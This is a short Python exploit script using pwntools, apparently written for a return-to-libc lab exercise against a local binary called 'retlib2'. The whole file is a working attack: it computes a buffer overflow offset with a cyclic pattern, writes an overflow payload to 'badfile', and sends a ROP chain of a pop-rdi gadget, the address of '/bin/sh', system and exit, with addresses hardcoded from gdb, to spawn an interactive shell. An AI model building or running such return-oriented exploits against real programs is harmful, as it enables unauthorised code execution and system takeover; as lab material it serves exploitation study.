from pwn import *
import os
CORE_LOC="/var/lib/apport/coredump"


# generate badfile
payload = cyclic(300, n=8)
pattern=b'aaaaeaaa' #from gdb
ra_offset = cyclic_find(pattern, n=8)
payload=b''
gets= p64(0x7ffff7e3a970)
if(len(payload) < ra_offset):
    payload +=b'|'*(ra_offset-len(payload))
payload+=gets
with open("badfile", "wb") as f:
    f.write(payload)
print(payload)
print("len payload: %d" % len(payload))

elf = context.binary = ELF('./retlib2')
#target = process('./retlib2', stdin=PTY)
target = process(stdin=PTY)
#gdb.attach(target, gdbscript='b *bof+96\nset $rip=$rip+0x4')

ra_addr=p64(0x7fffffffe848)
# from gdb
#system=p64(0x7ffff7dfe2c0)
system=p64(0x7ffff7e09290)
#bin_sh_addr=p64(0x7ffff7f605bd)
bin_sh_addr=p64(0x7ffff7f6b5bd)
pop_rdi_ret_gadget=p64(0x555555555363)
exit=p64(0x7ffff7dfda40)

payload=b''
gets_offset=4 #from gets payload overflow
if(len(payload) < gets_offset):
    payload +=b'|'*(gets_offset-len(payload))
payload+=pop_rdi_ret_gadget
payload+=bin_sh_addr
payload+=system
payload+=pop_rdi_ret_gadget
payload+=p64(0)
payload+=exit


# Send the payload
target.sendline(payload)
target.interactive()


# write gets_payload
with open("gets_payload", "wb") as f:
    f.write(payload)
